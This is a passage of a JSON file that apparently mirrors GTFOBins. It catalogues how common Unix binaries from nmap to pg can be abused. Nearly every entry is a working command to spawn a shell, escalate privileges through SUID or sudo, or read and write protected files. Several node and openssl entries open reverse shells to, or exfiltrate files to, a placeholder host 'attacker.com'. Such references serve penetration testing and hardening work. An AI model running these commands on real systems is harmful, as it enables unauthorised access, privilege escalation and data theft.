                    {
                        "description": "Input echo is disabled.",
                        "code": "sudo install -m =xs $(which nmap) .\n\nTF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "node",
        "url": "https://gtfobins.github.io/gtfobins/node/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(process.env.RPORT, process.env.RHOST, function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'"
                    }
                ]
            },
            {
                "function": "Bind shell",
                "description": "It can bind a shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell.",
                        "code": "export LPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(process.env.LPORT)'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send a local file via HTTP POST request.",
                        "code": "export URL=http://attacker.com\nexport LFILE=file_to_send\nnode -e 'require(\"fs\").createReadStream(process.env.LFILE).pipe(require(\"http\").request(process.env.URL))'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nnode -e 'require(\"http\").get(process.env.URL, res => res.pipe(require(\"fs\").createWriteStream(process.env.LFILE)))'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "node -e 'require(\"fs\").writeFileSync(\"file_to_write\", \"DATA\")'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/bin/ls\"))'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which node) .\n\n./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
                    }
                ]
            },
            {
                "function": "Capabilities",
                "description": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",
                "examples": [
                    {
                        "description": "",
                        "code": "cp $(which node) .\nsudo setcap cap_setuid+ep node\n\n./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
                    }
                ]
            }
        ]
    },
    {
        "name": "nohup",
        "url": "https://gtfobins.github.io/gtfobins/nohup/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
                    }
                ]
            },
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "",
                        "code": "COMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which nohup) .\n\n./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
                    }
                ]
            }
        ]
    },
    {
        "name": "npm",
        "url": "https://gtfobins.github.io/gtfobins/npm/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "npm exec /bin/sh"
                    },
                    {
                        "description": "Additionally, arbitrary script names can be used in place of preinstall and triggered by name with, e.g., npm -C $TF run preinstall.",
                        "code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nnpm -C $TF i"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Additionally, arbitrary script names can be used in place of preinstall and triggered by name with, e.g., npm -C $TF run preinstall.",
                        "code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i"
                    }
                ]
            }
        ]
    },
    {
        "name": "nroff",
        "url": "https://gtfobins.github.io/gtfobins/nroff/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nGROFF_BIN_PATH=$TF nroff"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file is typeset and some warning messages may appear.",
                        "code": "LFILE=file_to_read\nnroff $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff"
                    }
                ]
            }
        ]
    },
    {
        "name": "nsenter",
        "url": "https://gtfobins.github.io/gtfobins/nsenter/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "nsenter /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo nsenter /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "ntpdate",
        "url": "https://gtfobins.github.io/gtfobins/ntpdate/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nntpdate -a x -k $LFILE -d localhost"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ntpdate) .\n\nLFILE=file_to_read\n./ntpdate -a x -k $LFILE -d localhost"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo ntpdate -a x -k $LFILE -d localhost"
                    }
                ]
            }
        ]
    },
    {
        "name": "octave",
        "url": "https://gtfobins.github.io/gtfobins/octave/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "octave-cli --eval 'system(\"/bin/sh\")'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "octave-cli --eval 'filename = \"file_to_write\"; fid = fopen(filename, \"w\"); fputs(fid, \"DATA\"); fclose(fid);'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "octave-cli --eval 'format none; fid = fopen(\"file_to_read\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo octave-cli --eval 'system(\"/bin/sh\")'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which octave) .\n\n./octave-cli --eval 'system(\"/bin/sh\")'"
                    }
                ]
            }
        ]
    },
    {
        "name": "od",
        "url": "https://gtfobins.github.io/gtfobins/od/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which od) .\n\nLFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "openssl",
        "url": "https://gtfobins.github.io/gtfobins/openssl/",
        "functions": [
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "sub_description": "To receive the shell run the following on the attacker box:",
                        "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
                    },
                    {
                        "sub_description": "Communication between attacker and target will be encrypted.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "sub_description": "To collect the file run the following on the attacker box:",
                        "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save"
                    },
                    {
                        "sub_description": "Send a local file via TCP. Transmission will be encrypted.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nopenssl s_client -quiet -connect $RHOST:$RPORT < \"$LFILE\""
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "sub_description": "To send the file run the following on the attacker box:",
                        "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send"
                    },
                    {
                        "sub_description": "Fetch a file from a TCP port, transmission will be encrypted.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nopenssl s_client -quiet -connect $RHOST:$RPORT > \"$LFILE\""
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\""
                    },
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nopenssl enc -in \"$TF\" -out \"$LFILE\""
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nopenssl enc -in \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "",
                        "code": "openssl req -engine ./lib.so"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "To receive the shell run the following on the attacker box:",
                        "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
                    },
                    {
                        "sub_description": "Communication between attacker and target will be encrypted.",
                        "code": "sudo install -m =xs $(which openssl) .\n\nRHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"
                    },
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which openssl) .\n\nLFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "sub_description": "To receive the shell run the following on the attacker box:",
                        "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
                    },
                    {
                        "sub_description": "Communication between attacker and target will be encrypted.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"
                    }
                ]
            }
        ]
    },
    {
        "name": "openvpn",
        "url": "https://gtfobins.github.io/gtfobins/openvpn/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file is actually parsed and the first partial wrong line is returned in an error message.",
                        "code": "LFILE=file_to_read\nopenvpn --config \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which openvpn) .\n\n./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'"
                    },
                    {
                        "description": "The file is actually parsed and the first partial wrong line is returned in an error message.",
                        "code": "sudo install -m =xs $(which openvpn) .\n\nLFILE=file_to_read\n./openvpn --config \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"
                    },
                    {
                        "description": "The file is actually parsed and the first partial wrong line is returned in an error message.",
                        "code": "LFILE=file_to_read\nsudo openvpn --config \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "openvt",
        "url": "https://gtfobins.github.io/gtfobins/openvt/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file.",
                        "code": "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "opkg",
        "url": "https://gtfobins.github.io/gtfobins/opkg/",
        "functions": [
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "sub_description": "It runs an interactive shell using a specially crafted Debian package. Generate it with fpm and upload it to the target.",
                        "code": "TF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF"
                    },
                    {
                        "code": "sudo opkg install x_1.0_all.deb"
                    }
                ]
            }
        ]
    },
    {
        "name": "pandoc",
        "url": "https://gtfobins.github.io/gtfobins/pandoc/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "Pandoc has a builtin lua interpreter for writing filters, other functions might apply.",
                        "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\npandoc -L $TF /dev/null"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\necho DATA | pandoc -t plain -o \"$LFILE\""
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\npandoc -t plain \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which pandoc) .\n\nLFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Pandoc has a builtin lua interpreter for writing filters, other functions might apply.",
                        "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\nsudo pandoc -L $TF /dev/null"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "Pandoc has a builtin lua interpreter for writing filters, other functions might apply.",
                        "code": "sudo install -m =xs $(which pandoc) .\n\nTF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\n./pandoc -L $TF /dev/null"
                    }
                ]
            }
        ]
    },
    {
        "name": "paste",
        "url": "https://gtfobins.github.io/gtfobins/paste/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\npaste $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which paste) .\n\nLFILE=file_to_read\npaste $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo paste $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "pax",
        "url": "https://gtfobins.github.io/gtfobins/pax/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The output is a tar archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files.",
                        "code": "LFILE=file_to_read\npax -w \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "pdb",
        "url": "https://gtfobins.github.io/gtfobins/pdb/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\npdb $TF\ncont"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont"
                    }
                ]
            }
        ]
    },
    {
        "name": "pdflatex",
        "url": "https://gtfobins.github.io/gtfobins/pdflatex/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The read file will be part of the output.",
                        "code": "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The read file will be part of the output.",
                        "code": "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -"
                    },
                    {
                        "description": "",
                        "code": "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which pdflatex) .\n\n./pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "pdftex",
        "url": "https://gtfobins.github.io/gtfobins/pdftex/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "pdftex --shell-escape '\\write18{/bin/sh}\\end'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which pdftex) .\n\n./pdftex --shell-escape '\\write18{/bin/sh}\\end'"
                    }
                ]
            }
        ]
    },
    {
        "name": "perf",
        "url": "https://gtfobins.github.io/gtfobins/perf/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "perf stat /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which perf) .\n\n./perf stat /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo perf stat /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "pg",
        "url": "https://gtfobins.github.io/gtfobins/pg/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "pg /etc/profile\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "pg file_to_read"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which pg) .\n\n./pg file_to_read"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
